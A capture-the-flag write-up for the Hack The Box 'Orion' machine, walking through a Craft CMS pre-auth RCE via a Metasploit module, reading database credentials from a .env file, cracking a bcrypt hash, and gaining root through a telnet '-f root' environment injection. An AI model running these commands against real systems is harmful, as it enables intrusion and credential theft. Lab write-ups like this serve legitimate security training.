# Orion Machine

**Platform:** Hack The Box

**Author:** 0xL0m4

**Category:** Linux (Easy)

<img width="1612" height="153" alt="image" src="https://github.com/user-attachments/assets/fcf744af-4f40-4399-950f-7359875aa1ff" />


## Overview

In this write-up, we will solve the Orion machine by:

- Performing initial enumeration
- Discovering a vulnerable Craft CMS instance
- Exploiting a RCE vulnerability to gain initial access
- Logging into MySQL and retrieving user credentials
- Gaining SSH access
- Privilege escalation via a local Telnet service misconfiguration

## Tools Used

* Nmap
* Metasploit Framework
* Hashcat
* SSH
* Telnet

## Steps

### 1. Simple Recon 

We starting by adding the target to /etc/hosts:

```
echo "<your_machine_ip> orion.htb" | sudo tee -a /etc/hosts
```

We then scan the target using Nmap:

```
nmap -Pn orion.htb
```

Open ports:
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
```

### 2. Web Enumeration

While browsing the website, I try accessing robots.txt, but instead of the expected file, we receive an error page containing a stack trace.

From the error, we identify that the target is running Craft CMS built on the Yii framework.

I also notice version:

```
Yii framework version 2.0.51
```

### 3. Searching for Exploits

After identifying the framework , we search for known vulnerabilities and find:

CVE-2025-32432 — Craft CMS Pre-auth RCE

A working Metasploit module exists:

```
search cve_2025_32432
````

Output:

exploit/linux/http/craftcms_preauth_rce_cve_2025_32432

<img width="1920" height="310" alt="image" src="https://github.com/user-attachments/assets/7a973684-a5fc-4928-9a6b-14d09eddc670" />


### 4. Exploitation

Launch Metasploit and configure the exploit:
```
msfconsole
use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
show options
set RHOSTS orion.htb
set LHOST <your tun0 IP>
set LPORT <port>
run
```
After execution, we successfully obtain a Meterpreter session.

We then upgrade it to a proper shell:

```
script /dev/null -c /bin/bash
```

### 5. Local Enumeration

Inside the system, we are in the web directory let's take a step back and list files:
```
cd ..
ls -la
```
We find a .env file and print it:
```
cat .env
```
It contains database credentials:
```
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
CRAFT_DB_DATABASE=orion
```

### 6. Database Access

We connect to MySQL using the leaked credentials:

```
mysql -u root -p orion
Enter password: SuperSecureCraft123Pass!
```
List available tables:
```
SHOW TABLES;
```

We find the users table and extract its contents:
```
SELECT * FROM users;
```

We find an admin user with a bcrypt password hash.

### 7. Password Cracking

We crack the hash using Hashcat:

```
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

The password is successfully recovered: darkangel

### 8. Get user flag

Log in via SSH:
```
ssh adam@orion.htb
```
Password: darkangel


After login, you can retrieve the user flag:
```
cat user.txt
```

### 9. Privilege Escalation

Check listening services:
```
ss -tlnup
```

you can find a local service running:

127.0.0.1:23 (Telnet)

This indicates a local Telnet service is running.

Check the version:
```
telnet --version
```

We use a misconfiguration to escalate privileges:
```
USER="-f root" telnet -a 127.0.0.1 23
```

This gives us a root shell.

### 10. Get root flag
We confirm root privileges:
```
id
```
Output:

uid=0(root) gid=0(root)

Finally, we retrieve the root flag:

```
cat /root/root.txt
```

Voilaaaa, the root flag was revealed.

#

[The Machine Link](https://app.hackthebox.com/machines/Orion?sort_by=created_at&sort_type=desc)

See you in the next write-up!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
